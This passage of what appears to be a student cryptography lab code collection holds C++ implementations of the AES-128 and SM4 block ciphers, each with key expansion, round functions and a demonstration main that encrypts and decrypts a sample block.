0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92},\n                {0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84},\n                {0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06},\n                {0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B},\n                {0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73},\n                {0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E},\n                {0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B},\n                {0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4},\n                {0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F},\n                {0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF},\n                {0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61},\n                {0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D}\n        };\n//轮密钥加\nuint32_t LunMiYaoJia[10] = {0x01000000, 0x02000000, 0x04000000, 0x08000000, 0x10000000,\n                            0x20000000, 0x40000000, 0x80000000, 0x1b000000, 0x36000000};\nuint32_t left_bit_move(uint32_t val, int n) {\n    uint32_t size = sizeof(val) * 8;\n    n = n % size;\n    return (val &gt;&gt; (size - n) | (val &lt;&lt; n));//左移\n    //return (val &lt;&lt; (size - n) | (val &gt;&gt; n));//右移\n}\nstring string_to_hex(const string&amp; str) //字符串转化为十六进制\n{\n    string result=\"\";\n    string tmp;\n    stringstream ss;\n    for(int i=0;i&lt;str.size();i++)\n    {\n        ss&lt;&lt;hex&lt;&lt;int(str[i])&lt;&lt;endl;\n        ss&gt;&gt;tmp;\n        result+=tmp;\n    }\n    return result;\n}\nstring hex_to_string(const std::string&amp; str)\n{\n    std::string result;\n    for (size_t i = 0; i &lt; str.length(); i += 2)//十六进制两个字符为原始字符一个字符\n    {\n        std::string byte = str.substr(i, 2);//每次切两个字符\n        //将十六进制的string转成long再强转成int再转成char\n        char chr = (char)(int)strtol(byte.c_str(), NULL, 16);\n        result.push_back(chr);//将处理完的字符压入result中\n    }\n    return result;\n}\n//制作列混淆表\nuint8_t Mul_02(uint8_t x)\n{\n    if((x&gt;&gt;7) == 0)\n        return x&lt;&lt;1;\n    else\n        return ((x&lt;&lt;1)^0x1b)&amp;0xff;\n}\nuint32_t get_output_col1(uint8_t x)\n{\n    x = (uint32_t)x;\n    return (Mul_02(x)&lt;&lt;24)|(x&lt;&lt;16)|(x&lt;&lt;8)|(x^ Mul_02(x));\n    //2113\n}\n\nuint32_t get_output_col2(uint8_t x)\n{\n    x = (uint32_t)x;\n    return ((x^Mul_02(x))&lt;&lt;24)|(Mul_02(x)&lt;&lt;16)|(x&lt;&lt;8)|(x);\n    //3211\n}\nuint32_t get_output_col3(uint8_t x)\n{\n    x = (uint32_t)x;\n    return (x&lt;&lt;24)|((x^Mul_02(x))&lt;&lt;16)|(Mul_02(x)&lt;&lt;8)|(x);\n    //1321\n}\nuint32_t get_output_col4(uint8_t x)\n{\n    x = (uint32_t)x;\n    return (x&lt;&lt;24)|(x&lt;&lt;16)|((x^Mul_02(x))&lt;&lt;8)|(Mul_02(x));\n    //1132\n}\nvoid get_TAB()\n{\n    for(int i=0;i&lt;4;i++) {\n        for (int j = 0; j &lt; 256; j++) {\n            T[i][j]=0;\n        }\n    }\n    for(int i=0;i&lt;256;i++) {\n        T[0][i] = get_output_col1((uint8_t) i);\n        T[1][i] = get_output_col2((uint8_t) i);\n        T[2][i] = get_output_col3((uint8_t) i);\n        T[3][i] = get_output_col4((uint8_t) i);\n    }\n    //输出列混淆表\n//    for(int i=0;i&lt;4;i++) {\n//        for (int j = 0; j &lt; 256; j++) {\n//            //printf(\"%8x \",T[i][j]);\n//            cout &lt;&lt;setw(8)&lt;&lt;setfill('0')&lt;&lt; hex &lt;&lt; T[i][j] &lt;&lt; \" \";\n//        }\n//        cout&lt;&lt;endl;\n//    }\n}\n\nuint8_t GFMul(uint8_t a, uint8_t b) {\n    uint8_t p = 0;\n    uint8_t high;\n    for (int counter = 0; counter &lt; 8; counter++)\n    {\n        if ((b &amp; uint8_t(1)) != 0){//判断当前b的最后一位是否为0\n            p ^= a;}// p与a异或  即如果b当前最后一位不是0，就加上现在的a\n        high = (uint8_t) (a &amp; uint8_t(0x80));//高4位，看是否会溢出，high=1就是溢出\n        a &lt;&lt;= 1;//a左移一位，即乘以2\n        if (high != 0){//发生溢出\n            a ^= 0x1b; }// x^8 + x^4 + x^3 + x + 1\n        b &gt;&gt;= 1;//右移，看b的下一位了\n\n    }\n    return p;\n}\n\nvoid KeyExpansion(uint8_t key[], uint32_t w[])\n{\n    int j=0;\n    uint32_t temp=0;\n    // w[]的前4个就是输入的key\n    //初始化w[0]-&gt;w[3]\n    for(int i=0; i&lt;4;i++){\n        w[i] = (key[4*i]&lt;&lt;24)|(key[4*i+1]&lt;&lt;16)|(key[4*i+2]&lt;&lt;8)|(key[4*i+3]);\n        //printf(\"%d:%x\\n\",i,w[i]);\n    }\n    //创建w[4]-&gt;w[43]\n    for(int i=4; i&lt;44;i++){\n        if(i%4==0){\n            temp = left_bit_move(w[i-1],8);//循环左移8位\n            temp =  SubKeys(temp);\n            w[i] = temp ^ w[i-4] ^ LunMiYaoJia[j++];\n            //printf(\"%d:%x\\n\",i,w[i]);\n        }\n        else {\n            w[i] = w[i - 1] ^ w[i - 4];\n            //printf(\"%d:%x\\n\",i,w[i]);\n        }\n    }\n}\n\nvoid AddRoundKey(uint8_t mtx[],uint32_t w[])\n{\n\n    for(int i=0; i&lt;4; i++){\n        uint8_t w1 = w[i] &gt;&gt; 24 &amp; 0xff;\n        uint8_t w2 = (w[i] &gt;&gt; 16) &amp; 0xff;\n        uint8_t w3 = (w[i] &gt;&gt; 8) &amp; 0xff;\n        uint8_t w4 = (w[i]) &amp; 0xff;\n        mtx[i] ^= w1;  //按列异或\n        mtx[i+4] ^= w2;\n        mtx[i+8] ^= w3;\n        mtx[i+12] ^= w4;\n    }\n}\n\n//  S盒密钥变换 - 前4位为行号，后4位为列号\nuint32_t SubKeys(uint32_t temp)\n{\n    uint8_t w[4] = {0};\n    int j=0;\n    //循环4次\n    for(int i=3; i&gt;=0; i--){\n        w[j++] = (temp&gt;&gt;(i*8))&amp;0xff;\n    }\n    SubBytes(w,4);\n    return (w[0]&lt;&lt;24|w[1]&lt;&lt;16|w[2]&lt;&lt;8|w[3]);\n}\n\n//  S盒变换 - 前4位为行号，后4位为列号\nvoid SubBytes(uint8_t mtx[],int len)\n{\n    for(int i=0; i&lt;len; ++i)\n    {\n        int row = ((mtx[i]&gt;&gt;7)&amp;0x1)*8 + ((mtx[i]&gt;&gt;6)&amp;0x1)*4 + ((mtx[i]&gt;&gt;5)&amp;0x1)*2 + ((mtx[i]&gt;&gt;4)&amp;0x1)*1;    //第4 5 6 7位确定行\n        int col = ((mtx[i]&gt;&gt;3)&amp;0x1)*8 + ((mtx[i]&gt;&gt;2)&amp;0x1)*4 + ((mtx[i]&gt;&gt;1)&amp;0x1)*2 + (mtx[i]&amp;0x1)*1;       //第0 1 2 3位确定列\n        mtx[i] = S_Box[row][col];\n    }\n}\nvoid InvSubBytes(uint8_t mtx[],int len)\n{\n    for(int i=0; i&lt;len; ++i)\n    {\n        int row = ((mtx[i]&gt;&gt;7)&amp;0x1)*8 + ((mtx[i]&gt;&gt;6)&amp;0x1)*4 + ((mtx[i]&gt;&gt;5)&amp;0x1)*2 + ((mtx[i]&gt;&gt;4)&amp;0x1)*1;    //第4 5 6 7位确定行\n        int col = ((mtx[i]&gt;&gt;3)&amp;0x1)*8 + ((mtx[i]&gt;&gt;2)&amp;0x1)*4 + ((mtx[i]&gt;&gt;1)&amp;0x1)*2 + (mtx[i]&amp;0x1)*1;       //第0 1 2 3位确定列\n        mtx[i] = Inv_S_Box[row][col];\n    }\n}\n//行移位\nvoid ShiftRows(uint8_t mtx[])\n{\n    uint8_t temp=mtx[4];\n    //第二行左移一位\n    for(int i=0; i&lt;3; i++){\n        mtx[i+4] = mtx[i+5];\n    }\n    mtx[7] = temp;\n    //第三行左移二位\n    for(int i=0; i&lt;2; i++){\n        temp = mtx[i+8];\n        mtx[i+8] = mtx[i+10];\n        mtx[i+10] = temp;\n    }\n    //第四行左移三位\n    temp = mtx[15];\n    for(int i=3; i&gt;0; i--) {\n        mtx[i + 12] = mtx[i + 11];\n    }\n    mtx[12] = temp;\n}\n\nvoid InvShiftRows(uint8_t mtx[])\n{\n    // 第二行循环右移一位\n    uint8_t temp = mtx[7];\n    for(int i=3; i&gt;0; --i)\n        mtx[i+4] = mtx[i+3];\n    mtx[4] = temp;\n    // 第三行循环右移两位\n    for(int i=0; i&lt;2; ++i)\n    {\n        temp = mtx[i+8];\n        mtx[i+8] = mtx[i+10];\n        mtx[i+10] = temp;\n    }\n    // 第四行循环右移三位\n    temp = mtx[12];\n    for(int i=0; i&lt;3; ++i)\n        mtx[i+12] = mtx[i+13];\n    mtx[15] = temp;\n}\n\nvoid MixColumns(uint8_t c[])\n{\n    uint32_t total[4]={0};  //存储每一列取出的4个32比特字节异或的结果，即列混淆后的第i列\n    uint32_t temp[16]={0};  //存储16个 每个字节从T表得到的32比特的4字节一列\n    for(int i=0;i&lt;16;i++){\n        temp[i] = T[i/4][c[i]];\n    }\n\n    for(int i=0; i&lt;4;i++) {\n        total[i] = temp[i] ^ temp[i+4] ^ temp[i+8] ^ temp[i+12];\n        c[i] = (total[i]&gt;&gt;24)&amp;0xff;\n        c[i+4]=(total[i]&gt;&gt;16)&amp;0xff;\n        c[i+8] = (total[i]&gt;&gt;8)&amp;0xff;\n        c[i+12] = (total[i])&amp;0xff;\n    }\n}\nvoid InvMixColumns(uint8_t mtx[])\n{\n    uint8_t arr[4];\n    for(int i=0; i&lt;4; ++i) {\n        for (int j = 0; j &lt; 4; ++j)\n            arr[j] = mtx[i + j * 4];\n\n        mtx[i] = GFMul(0x0e, arr[0]) ^ GFMul(0x0b, arr[1]) ^ GFMul(0x0d, arr[2]) ^ GFMul(0x09, arr[3]);\n        mtx[i + 4] = GFMul(0x09, arr[0]) ^ GFMul(0x0e, arr[1]) ^ GFMul(0x0b, arr[2]) ^ GFMul(0x0d, arr[3]);\n        mtx[i + 8] = GFMul(0x0d, arr[0]) ^ GFMul(0x09, arr[1]) ^ GFMul(0x0e, arr[2]) ^ GFMul(0x0b, arr[3]);\n        mtx[i + 12] = GFMul(0x0b, arr[0]) ^ GFMul(0x0d, arr[1]) ^ GFMul(0x09, arr[2]) ^ GFMul(0x0e, arr[3]);\n    }\n}\n\nvoid Encrypt(uint8_t m[],uint32_t key[],uint8_t c[])\n{\n    //首先进行开始的轮密钥加\n    int round=0;\n    uint32_t w[4]={0};\n    for(int k=0; k&lt;4; k++)\n        w[k] = key[4*round+k];\n    for(int i=0; i&lt;16; i++)\n        c[i] = m[i];\n    AddRoundKey(c,w);\n    //接下来是9轮一摸一样的函数\n    for(int i = 1;i&lt;=9;i++)\n    {\n        SubBytes(c,16);//字节替代\n        ShiftRows(c);//行移位\n        MixColumns(c);//列混淆\n        round++;\n        //cout&lt;&lt;\"轮数\"&lt;&lt;round&lt;&lt;endl;\n        for(int k=0; k&lt;4; k++) {\n            w[k] = key[4 * round + k];\n        }\n        AddRoundKey(c,w);//轮密钥加\n    }\n    //最后一轮\n    round++;\n    //cout&lt;&lt;\"轮数\"&lt;&lt;round&lt;&lt;endl;\n    for(int k=0; k&lt;4; k++) {\n        w[k] = key[4 * round + k];\n        //(\"%x \",w[k]);\n    }\n    SubBytes(c,16);//字节替代\n    ShiftRows(c);//行移位\n    AddRoundKey(c,w);//轮密钥加\n}\nvoid Decrypt(uint8_t c[],uint32_t key[],uint8_t m[])\n{\n    //首先进行开始的轮密钥加\n    //注意密钥反着来\n    int round=10;\n    uint32_t w[4]={0};\n    for(int k=0; k&lt;4; k++)\n        w[k] = key[4*round+k];  //密钥赋值\n    for(int i=0; i&lt;16; i++)\n        m[i] = c[i];\n    AddRoundKey(m,w);\n    //接下来是9轮一摸一样的函数\n    for(int i = 1;i&lt;=9;i++)\n    {\n        InvShiftRows(m);//行移位\n        InvSubBytes(m,16);//字节替代\n        round--;\n        //cout&lt;&lt;\"轮数\"&lt;&lt;round&lt;&lt;endl;\n        for(int k=0; k&lt;4; k++) {\n            w[k] = key[4 * round + k];\n        }\n        AddRoundKey(m,w);//轮密钥加\n        InvMixColumns(m);//列混淆\n    }\n    //最后一轮\n    round--;\n    //cout&lt;&lt;\"轮数\"&lt;&lt;round&lt;&lt;endl;\n    for(int k=0; k&lt;4; k++) {\n        w[k] = key[4 * round + k];\n        //(\"%x \",w[k]);\n    }\n    InvShiftRows(m);//行移位\n    InvSubBytes(m,16);//字节替代\n    AddRoundKey(m,w);//轮密钥加\n}\nvoid Display(uint8_t Matrix[])\n{\n    for(int i=0; i&lt;16; i++) {\n        printf(\"%x \", Matrix[i]);\n        if(i%4==3)\n            cout&lt;&lt;endl;\n    }\n}\nvoid DisplayKeys(uint32_t Matrix[])\n{\n    for(int i=0; i&lt;44; i++) {\n        printf(\"第%d列:%x\\n\",i,Matrix[i]);\n    }\n}\nint main()\n{\n    string mingwen;\n    string miwen;\n    uint8_t key[16]={0};\n    uint8_t m[16]={0};\n    cout&lt;&lt;\"请输入明文(128bits):\";\n    cin&gt;&gt;mingwen;\n    cout&lt;&lt;\"请输入密文(128bits):\";\n    cin&gt;&gt;miwen;\n    for(int i=0;i&lt;16;i++)\n    {\n        m[i] = (uint8_t)(mingwen[i]);\n        key[i] = (uint8_t)(miwen[i]);\n    }\n    uint8_t c[16]={0};\n    uint8_t x[16]={0};\n    uint32_t new_key[44]={0};   //存储44列密钥\n    cout&lt;&lt;\"明文:\"&lt;&lt;endl;\n    Display(m);\n    cout&lt;&lt;\"密钥:\"&lt;&lt;endl;\n    Display(key);\n    get_TAB();//生成列混淆表\n    KeyExpansion(key,new_key);\n    cout&lt;&lt;\"生成密钥\"&lt;&lt;endl;\n    //DisplayKeys(new_key);\n    Encrypt(m,new_key,c);\n    cout&lt;&lt;\"加密结果\"&lt;&lt;endl;\n    Display(c);\n    Decrypt(c,new_key,x);\n    cout&lt;&lt;\"解密结果(hex)\"&lt;&lt;endl;\n    Display(x);\n    cout&lt;&lt;\"解密结果(string)\"&lt;&lt;endl;\n    for(int i=0;i&lt;16;i++)\n        cout&lt;&lt;(char)x[i];\n    return 0;\n}\n\nSM4#include \"string.h\"\n#include&lt;iostream&gt;\n#include &lt;stdint.h&gt;\n#include&lt;string&gt;\nusing namespace std;\nuint32_t shift_l(uint32_t s,int n)//循环左移n位\n{\n    int size=sizeof (s)*8;      //字节数乘以8代表一共多少位\n    return s&lt;&lt;(n)|(s&gt;&gt;size-n);\n}\nuint32_t Sb(uint32_t s) {\n\n    uint8_t SboxTable[16][16] =\n            {\n                    {0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05},\n                    {0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99},\n                    {0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62},\n                    {0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6},\n                    {0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8},\n                    {0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35},\n                    {0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87},\n                    {0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e},\n                    {0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1},\n                    {0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3},\n                    {0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f},\n                    {0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51},\n                    {0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8},\n                    {0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0},\n                    {0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84},\n                    {0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48}};\n    uint8_t a[4];\n    a[0]=(s&gt;&gt;24)&amp;0xff;     //最高8位\n    a[1]=(s&gt;&gt;16)&amp;0xff;\n    a[2]=(s&gt;&gt;8)&amp;0xff;\n    a[3]=s&amp;0xff;\n    uint8_t b[4];\n    for(int i=0;i&lt;4;i++) {\n        int row = ((a[i] &gt;&gt; 7) &amp; 1) * 8 + ((a[i] &gt;&gt; 6) &amp; 1) * 4 + ((a[i] &gt;&gt; 5) &amp; 1) * 2 + ((a[i] &gt;&gt; 4) &amp; 1) * 1;\n        int col = ((a[i] &gt;&gt; 3) &amp; 1) * 8 + ((a[i] &gt;&gt; 2) &amp; 1) * 4 + ((a[i] &gt;&gt; 1) &amp; 1) * 2 + ((a[i]) &amp; 1) * 1;\n        b[i] = SboxTable[row][col];\n    }\n    uint32_t result;\n    result=(b[0]&lt;&lt;24)|(b[1]&lt;&lt;16)|(b[2]&lt;&lt;8)|b[3];\n    return result;\n}\n\nuint32_t L_change(uint32_t s)\n{\n    return s^ shift_l(s,13)^ shift_l(s,23);\n}\n\nuint32_t T_change(uint32_t s)\n{\n    return L_change(Sb(s));\n}\n\nvoid keyexpand(uint32_t MK[4],uint32_t rk[32])\n{\n    uint32_t FK[4]={0xA3B1BAC6, 0x56AA3350,0x677D9197, 0xB27022DC};\n    uint32_t CK[32] = { 0x00070E15, 0x1C232A31, 0x383F464D, 0x545B6269,\n                        0x70777E85, 0x8C939AA1, 0xA8AFB6BD, 0xC4CBD2D9,\n                        0xE0E7EEF5, 0xFC030A11, 0x181F262D, 0x343B4249,\n                        0x50575E65, 0x6C737A81, 0x888F969D, 0xA4ABB2B9,\n                        0xC0C7CED5, 0xDCE3EAF1, 0xF8FF060D, 0x141B2229,\n                        0x30373E45, 0x4C535A61, 0x686F767D, 0x848B9299,\n                        0xA0A7AEB5, 0xBCC3CAD1, 0xD8DFE6ED, 0xF4FB0209,\n                        0x10171E25, 0x2C333A41, 0x484F565D, 0x646B7279 };\n    uint32_t k[4]={MK[0]^FK[0],MK[1]^FK[1],MK[2]^FK[2],MK[3]^FK[3]};\n    uint32_t K[36];\n    for(int i=0;i&lt;=3;i++)\n        K[i]=k[i];\n    for(int i=0;i&lt;32;i++)\n    {\n        K[i+4]=K[i]^ T_change(K[i+1]^K[i+2]^K[i+3]^CK[i]);\n    }\n    for(int i=0;i&lt;32;i++)\n        rk[i]=K[i+4];\n\n}\n\nuint32_t Lchange(uint32_t s)\n{\n    return s^shift_l(s,2)^shift_l(s,10)^shift_l(s,18)^shift_l(s,24);\n}\n\nuint32_t Tchange(uint32_t s)\n{\n    return Lchange(Sb(s));\n}\n\nuint32_t fround(uint32_t X[4],uint32_t rk)\n{\n    uint32_t B=X[1]^X[2]^X[3]^rk;\n    return X[0]^ L_change(Sb(B));\n}\n\nstatic uint32_t out1[4];\n\nvoid SM4(uint32_t X[4],uint32_t rk[32])\n{\n    uint32_t Y[36];\n    Y[0]=X[0];\n    Y[1]=X[1];\n    Y[2]=X[2];\n    Y[3]=X[3];\n    for(int i=0;i&lt;=31;i++) {\n        Y[i + 4] = Y[i] ^ Tchange(Y[i + 1] ^ Y[i + 2] ^ Y[i + 3] ^ rk[i]);\n    }\n//    for(int i=0;i&lt;36;i++) {\n//        printf(\"第%d轮:%x \\n\",i,Y[i]);\n//    }\n    out1[0]=Y[35];\n    out1[1]=Y[34];\n    out1[2]=Y[33];\n    out1[3]=Y[32];\n}\n\nstatic uint32_t out2[4];\n\nvoid sm4(uint32_t Y[4],uint32_t rk[32])\n{\n    uint32_t X[36];\n    X[35]=Y[0];\n    X[34]=Y[1];\n    X[33]=Y[2];\n    X[32]=Y[3];\n    for(int i=31;i&gt;=0;i--)\n    {\n        X[i]=X[i+4]^ Tchange(X[i+3]^X[i+2]^X[i+1]^rk[i]);\n    }\n    out2[0]=X[0];\n    out2[1]=X[1];\n    out2[2]=X[2];\n    out2[3]=X[3];\n}\nint main() {\n    uint32_t ming[4]={0x01234567,0x89ABCDEF,0xFEDCBA98,0x76543210};\n    cout&lt;&lt;\"明文:\"&lt;&lt;endl;\n    for(int i=0;i&lt;4;i++)\n        cout&lt;&lt;hex&lt;&lt;ming[i]&lt;&lt;\" \";\n    cout&lt;&lt;endl;\n    uint32_t MK[4]={0x01234567,0x89ABCDEF,0xFEDCBA98,0x76543210};\n    cout&lt;&lt;\"密钥：\"&lt;&lt;endl;\n    for(int i=0;i&lt;4;i++)\n        cout&lt;&lt;hex&lt;&lt;MK[i]&lt;&lt;\" \";\n    cout&lt;&lt;endl;\n    uint32_t rk[32];\n    keyexpand(MK,rk);\n//    cout&lt;&lt;\"扩展密钥：\"&lt;&lt;endl;\n//    for(int i=0;i&lt;32;i++)\n//        cout&lt;&lt;i&lt;&lt;\"轮扩展密钥\"&lt;&lt;rk[i]&lt;&lt;endl;\n    cout&lt;&lt;\"加密结果：\"&lt;&lt;endl;\n    SM4(ming,rk);\n    for(int i=0;i&lt;4;i++)\n        cout&lt;&lt;out1[i]&lt;&lt;\" \";\n    cout&lt;&lt;endl;\n    cout&lt;&lt;\"解密结果:\"&lt;&lt;endl;\n    sm4(out1,rk);\n    for(int i=0;i&lt;4;i++)\n        cout&lt;&lt;out2[i]&lt;&lt;\" \";\n    cout&lt;&lt;endl;\n    return 0;\n}\n\n","tags":["密码学实验代码集合"]}]